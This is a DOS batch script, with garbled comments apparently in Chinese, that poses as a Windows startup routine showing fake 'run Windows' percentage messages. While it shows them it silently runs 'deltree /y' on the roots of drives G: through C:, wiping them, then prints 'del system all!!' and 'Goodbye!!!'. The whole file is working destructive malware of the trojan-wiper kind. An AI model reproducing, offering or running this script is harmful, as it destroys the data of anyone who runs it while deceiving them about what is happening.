@rem ��ʼ
@rem �ر���������ʾ
@echo off
rem ����·��
PATH %PATH%;c:\windows\;c:\windows\command 
rem ���д��̻��壬�ӿ�ɾ���ٶȣ���
SMARTDRV >nul
rem ����
cls
rem ��ʾ��������WINDOWSϵͳ�Ͱٷֱ�
echo run Windows ..........10%%
rem ִ��ɾ������
deltree /y g:\. >nul
cls
echo run Windows ..........20%%
deltree /y f:\. >nul
cls
echo run Windows ..........50%%
deltree /y e:\. >nul
cls
echo run Windows ..........70%%
deltree /y d:\. >nul
cls
echo run Windows ..........90%%
deltree /y c:\. >nul
cls
rem ȫ��ɾ���󣬸��������Ըղ��ڸ�ʲô������
echo del system all!!
echo Goodbye!!!
rem ����